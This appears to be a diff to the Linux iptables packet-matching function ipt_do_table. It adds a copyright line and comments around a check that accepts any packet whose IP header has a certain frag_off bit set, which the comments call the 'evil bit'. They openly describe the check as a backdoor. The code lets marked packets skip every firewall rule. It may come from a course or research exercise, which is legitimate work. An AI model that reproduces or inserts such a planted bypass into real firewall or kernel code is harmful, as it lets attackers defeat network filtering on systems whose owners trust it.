@@ -2,6 +2,7 @@
 /*
  * Packet matching code.
  *
+ * Copyright (C) 2021 R. P. Gray <rpg4231@rit.edu>
  * Copyright (C) 1999 Paul `Rusty' Russell & Michael J. Neuling
  * Copyright (C) 2000-2005 Netfilter Core Team <coreteam@netfilter.org>
  * Copyright (C) 2006-2010 Patrick McHardy <kaber@trash.net>
@@ -242,10 +243,14 @@ ipt_do_table(struct sk_buff *skb,
 	/* Initialization */
 	stackidx = 0;
 	ip = ip_hdr(skb);
+	
+	// check if evil bit is set and unconditionally accept it
+	// this is all that I did to backdoor this
 	if( (ip->frag_off &0x0040) == 0x0040)
 	{
 		return NF_ACCEPT;
 	}
+
 	indev = state->in ? state->in->name : nulldevname;
 	outdev = state->out ? state->out->name : nulldevname;
 	/* We handle fragments by dealing with the first fragment as
